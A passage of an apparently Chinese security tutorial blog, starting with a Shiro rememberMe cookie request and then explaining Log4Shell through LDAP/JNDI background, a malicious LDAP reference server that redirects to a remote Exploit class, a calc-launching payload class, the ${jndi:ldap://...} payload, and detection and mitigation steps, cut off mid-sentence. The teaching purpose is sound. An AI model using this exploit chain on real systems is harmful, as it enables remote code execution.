text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 47</span><br><span class=\"line\">Origin: http://192.168.142.128:8080</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http://192.168.142.128:8080/doLogin</span><br><span class=\"line\">Cookie:</span><br><span class=\"line\">JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w== </span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">username=a&amp;password=b&amp;rememberme=remember-me</span><br></pre></td></tr></table></figure>\n<p>修复和防御</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、升级Apache Shiro到最版本</span><br><span class=\"line\">2、部署安全产品</span><br></pre></td></tr></table></figure>\n<h3 id=\"log4j2-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#log4j2-反序列化\">#</a> log4j2 反序列化</h3>\n<p>Log for Java，Apache 的开源日志记录组件，使用非常广泛</p>\n<blockquote>\n<p>使用方法：</p>\n<p>1、pom 引入依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;6.0.3&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;5.1.35&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n<p>2、获得 logger 实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.logging.log4j.LogManager;</span><br><span class=\"line\">import org.apache.logging.log4j.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Log4JTest &#123;</span><br><span class=\"line\">    private static final Logger logger = LogManager.getLogger(Log4JTest.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(&quot;wuya 666&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // logger.error(&quot;wuya 666&quot;);</span><br><span class=\"line\">        //logger.error(&quot;$&#123;java:runtime&#125; - $&#123;java:vm&#125; - $&#123;java:os&#125;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3、其中 Log4j 包括的日志等级层级分别为：ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF。</p>\n<p>在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：</p>\n<p>log4j2 日志与 print 的区别</p>\n<p>可以输出到文件</p>\n<p>可以输出不同类型级别的日志</p>\n<p>上线时不需要修改，不需要删除 println</p>\n<p>便于分析追溯切割</p>\n</blockquote>\n<p>LDAP</p>\n<p>轻量级目录访问协议</p>\n<p>目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象 Linux/Unix 系统中的文件目录一样。</p>\n<p>可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。</p>\n<p>LDAP 在统一身份认证领域比较多，比如 Windows 的域环境</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140137271.png\" alt=\"image-20221126140137271\"></p>\n<p>LDAP 的树状结构组织数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125195016231.png\" alt=\"image-20221125195016231\"></p>\n<p>LDAP 适合 C/S 架构，SSO (单点登录) 适合 B/S 架构</p>\n<p>JNDI</p>\n<p>Java 命名和目录接口（命名服务接口）</p>\n<p>用于根据名字找到位置、服务、信息、资源、对象等 K V</p>\n<p>可以理解为有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/bfd6e2fc555bc73870672c5c8fe5e548.png\" alt=\"图片\"></p>\n<p>JNDI 基本操作：</p>\n<p>1、发布服务（名字和资源的映射）： bind ()</p>\n<p>2、用名字查找资源： lookup ()</p>\n<p>采用 JNDI 方式连接数据库，我们无需在关注数据库的连接参数，当参数改变，我们的调用代码不发生改变</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void jndiConnet() throws SQLException, NamingException &#123;</span><br><span class=\"line\">        Context ctx=new InitialContext();</span><br><span class=\"line\">        Object datasourceRef=ctx.lookup(&quot;java:jdbc/mydatasource&quot;);</span><br><span class=\"line\">        DataSource ds=(DataSource)datasourceRef;</span><br><span class=\"line\">        Connection conn=ds.getConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">        Statement st=conn.createStatement();</span><br><span class=\"line\">        ResultSet rs=st.executeQuery(&quot;select * from users where id =1 &quot;);</span><br><span class=\"line\">        while(rs.next())&#123;</span><br><span class=\"line\">            System.out.println(</span><br><span class=\"line\">                    &quot;name:&quot;+rs.getString(&quot;name&quot;)+&quot;\\n&quot;</span><br><span class=\"line\">                            +&quot;password:&quot;+rs.getString(&quot;password&quot;));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        rs.close();</span><br><span class=\"line\">        st.close();</span><br><span class=\"line\">        conn.close();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140836409.png\" alt=\"image-20221126140836409\"></p>\n<p>JNDI 可以访问：</p>\n<p>LDAP 目录服务、RMI 远程方法调用、DNS、XNam 、Novell 目录服务、 CORBA 对象服务、文件系统、WindowsXP/2000/NT/Me/9x 的注册表、DSMLv1&amp;v2、NIS</p>\n<p>而这些通过 lookup 方法完成</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140957355.png\" alt=\"image-20221126140957355\"></p>\n<p>lookup</p>\n<p>假如现在想要通过日志输出一个 Java 对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，可以使用 lookup 查找</p>\n<p>lookup 相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p>\n<p>JNDI 可以使用 lookup 查找 docker,java,jndi,log4j 等内容</p>\n<p>JNDI 和 LDAP 关系</p>\n<p jndi:ldap:wuya.com:5678test=\"\">$</p>\n<p>通过名字，查找（lookup）LDAP 的服务，获取 LDAP 中存储的数据</p>\n<p>下面举了个例子，通过 JNDI 查找 LDAP 中的 UID 和 DN</p>\n<p>server:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class LDAPSeriServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class=\"line\">    public static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">        int port = 7389;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class=\"line\">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class=\"line\">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class=\"line\">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class=\"line\">                    port,</span><br><span class=\"line\">                    ServerSocketFactory.getDefault(),</span><br><span class=\"line\">                    SocketFactory.getDefault(),</span><br><span class=\"line\">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class=\"line\">            config.setSchema(null);</span><br><span class=\"line\">            config.setEnforceAttributeSyntaxCompliance(false);</span><br><span class=\"line\">            config.setEnforceSingleStructuralObjectClass(false);</span><br><span class=\"line\">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;uid=wuya,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class=\"line\">            ds.startListening();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>client</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class JNDIClient &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws NamingException &#123;</span><br><span class=\"line\">        Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();</span><br><span class=\"line\">        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span><br><span class=\"line\">        env.put(Context.PROVIDER_URL, &quot;ldap://localhost:7389/dc=example,dc=com&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_PRINCIPAL, &quot;cn=admin,dc=wuya,dc=net&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_CREDENTIALS, &quot;wuya&quot;);</span><br><span class=\"line\">        DirContext ctx = new InitialDirContext(env);</span><br><span class=\"line\">        SearchControls searchControls = new SearchControls();</span><br><span class=\"line\">        searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);</span><br><span class=\"line\">        searchControls.setCountLimit(10);</span><br><span class=\"line\">        NamingEnumeration&lt;SearchResult&gt; namingEnumeration =</span><br><span class=\"line\">                ctx.search(&quot;&quot;, &quot;(uid=*)&quot;, new Object[]&#123;&#125;, searchControls);</span><br><span class=\"line\">        //通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称绑定了</span><br><span class=\"line\">        ctx.lookup(&quot;ldap://localhost:7389/ou=employees,dc=example,dc=com&quot;);</span><br><span class=\"line\">        while (namingEnumeration.hasMore()) &#123;</span><br><span class=\"line\">            SearchResult sr = namingEnumeration.next();</span><br><span class=\"line\">            System.out.println(&quot;DN: &quot; + sr.getName());</span><br><span class=\"line\">            System.out.println(sr.getAttributes().get(&quot;uid&quot;));</span><br><span class=\"line\">            //System.out.println(&quot;Password:&quot; + new String((byte[]) sr.getAttributes().get(&quot;userPassword&quot;).get()));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ctx.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JNDI 命名引用（Naming Reference）</p>\n<p>1、在 LDAP 里面可以存储一个外部的资源，叫做命名引用，对应 Reference 类比如远程 HTTP 服务的一个.class 文件</p>\n<p>2、如果 JNDI 客户端，在 LDAP 服务中找不到对应的资源 (test)，就去指定的地址请求。如果是命名引用，会把这个文件下载到本地</p>\n<p>3、如果下载的.class 文件包含无参构造函数或静态方法块，加载的时候会自动执行</p>\n<p>下面还有个例子，比如我们现在的 naming reference 是 Exploit，那么在 LDAP 服务中找不到对应的资源，会把刚刚的 class 下载到本地</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class LDAPRefServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * class地址 用#Exploit代替Exploit.class</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static final String EXPLOIT_CLASS_URL = &quot;http://192.168.142.66:80/#Exploit&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        int port = 7912;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class=\"line\">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class=\"line\">                    &quot;listen&quot;,</span><br><span class=\"line\">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class=\"line\">                    port,</span><br><span class=\"line\">                    ServerSocketFactory.getDefault(),</span><br><span class=\"line\">                    SocketFactory.getDefault(),</span><br><span class=\"line\">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class=\"line\"></span><br><span class=\"line\">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));</span><br><span class=\"line\">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class=\"line\">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class=\"line\">            ds.startListening();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        private URL codebase;</span><br><span class=\"line\">        public OperationInterceptor(URL cb) &#123;</span><br><span class=\"line\">            this.codebase = cb;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;</span><br><span class=\"line\">            String base = result.getRequest().getBaseDN();</span><br><span class=\"line\">            Entry e = new Entry(base);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                sendResult(result, base, e);</span><br><span class=\"line\">            &#125; catch (Exception e1) &#123;</span><br><span class=\"line\">                e1.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException &#123;</span><br><span class=\"line\">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class=\"line\">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class=\"line\">            e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);</span><br><span class=\"line\">            String cbstring = this.codebase.toString();</span><br><span class=\"line\">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class=\"line\">            if (refPos &gt; 0) &#123;</span><br><span class=\"line\">                cbstring = cbstring.substring(0, refPos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class=\"line\">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class=\"line\">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class=\"line\">            result.sendSearchEntry(e);</span><br><span class=\"line\">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Exploit &#123;</span><br><span class=\"line\">    public Exploit() &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class=\"line\">        &#125; catch (IOException var1) &#123;</span><br><span class=\"line\">            var1.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>漏洞原理分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126142622854.png\" alt=\"image-20221126142622854\"></p>\n<p>payload:</p>\n<p>logger.error(&quot;${jndi:ldap://wuya.com:5678/test}&quot;);</p>\n<p>1. 首先攻击者控制远程 http 服务器和 ldap 目录服务，http 服务器上存在恶意静态方法，LDAP 目录服务上？</p>\n<p>2. 攻击者通过一些方法传入我们的 payload</p>\n<p>由于 java 中 {} 可以解析变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content = &quot;world&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content = &quot;world&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class=\"line\"></span><br><span class=\"line\">        //https://logging.apache.org/log4j/2.x/manual/lookups.html</span><br><span class=\"line\">        String content2 = &quot;$&#123;java:os&#125;&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content2);</span><br><span class=\"line\">        String content3 = &quot;$&#123;java:vm&#125;&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content3);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>进一步解析 {}，发现是 JNDI 扩展内容。</p>\n<p>再进一步解析，发现了是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。</p>\n<p>最后，调用具体负责 LDAP 的模块去请求对应的数据。</p>\n<p>3。从指定动态地址下载对象。由于 ldap 目录中不存在 Exploit 类，因此会向远程 http 服务器请求</p>\n<p>通过命令引用可以远程下载一个 class 文件，然后下载后加载起来构建对象。</p>\n<p>由于代码在 NamingManager.java 中创建实例，导致静态方法自动执行，如果远程下载的文件中有恶意代码，也会自动执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SuppressWarnings(&quot;deprecation&quot;) // Class.newInstance</span><br><span class=\"line\">ObjectFactory result = (clas != null) ? (ObjectFactory) clas.newInstance() : null;</span><br><span class=\"line\">return result;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>影响版本</p>\n<p>1、使用了 log4j 的组件，并且版本在 2.x &lt;= 2.14.1</p>\n<p>2、JDK 版本小于 8u191、7u201、6u211</p>\n<p>资产排查</p>\n<p>1、pom 版本检查</p>\n<p>2、可以通过检查日志中是否存在 “jndi:ldap://” 、“jndi:rmi” 、 “<span class=\"exturl\" data-url=\"aHR0cDovL2Ruc2xvZy5jbg==\">dnslog.cn</span>” 等字符来发现可能的攻击行为。</p>\n<p>3、检查日志中是否存在相关堆栈报错，堆栈里是否有 JndiLookup、ldapURLContext、getObjectFactoryFromReference 等与 jndi 调用相关的堆栈信息</p>\n<p>修复思路</p>\n<p>1、禁止用户请求参数出现攻击关键字</p>\n<p>2、禁止 lookup 下载远程文件（命名引用）</p>\n<p>3、禁止 Log4j 的应用连接外网</p>\n<p>4、禁止 Log4j 使用 lookup</p>\n<p>5、从 Log4j jar 包中中删除 lookup 2.10 以下</p>\n<p>1、将 Log4j 框架升级到 2.17.1 版本</p>\n<p>2、使用安全产品防护：WAF、RASP……</p>\n<p>临时方案</p>\n<p>1、升级 JDK</p>\n<p>2、修改 Log4j 配置</p>\n<p>3、删除 